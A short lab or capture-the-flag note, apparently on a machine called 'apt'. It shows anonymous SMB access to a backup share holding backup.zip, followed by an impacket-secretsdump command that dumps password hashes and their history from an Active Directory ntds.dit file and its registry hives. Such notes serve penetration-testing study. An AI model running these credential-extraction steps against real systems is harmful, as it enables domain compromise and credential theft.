# Obtaining NTDS.DIT

```bash
$ smbclient  //apt/backup -N                                                                                                                                                         
Anonymous login successful                                                                                                                                                                    
Try "help" to get a list of possible commands.                                                                                                                                                
smb: \> dir                                                                                                                                                                                   
  .                                   D        0  Thu Sep 24 04:30:52 2020                                                                                                                    
  ..                                  D        0  Thu Sep 24 04:30:52 2020                                                                                                                    
  backup.zip                          A 10650961  Thu Sep 24 04:30:32 2020                                                                                                                    
                                                                                                                                                                                              
                5114623 blocks of size 4096. 2634121 blocks available 
```

![[Pasted image 20211215165521.png]]

```bash
impacket-secretsdump -pwd-last-set -user-status -history -ntds -ntds.dit -security SECURITY -system SYSTEM local | tee secretdump.backup
```
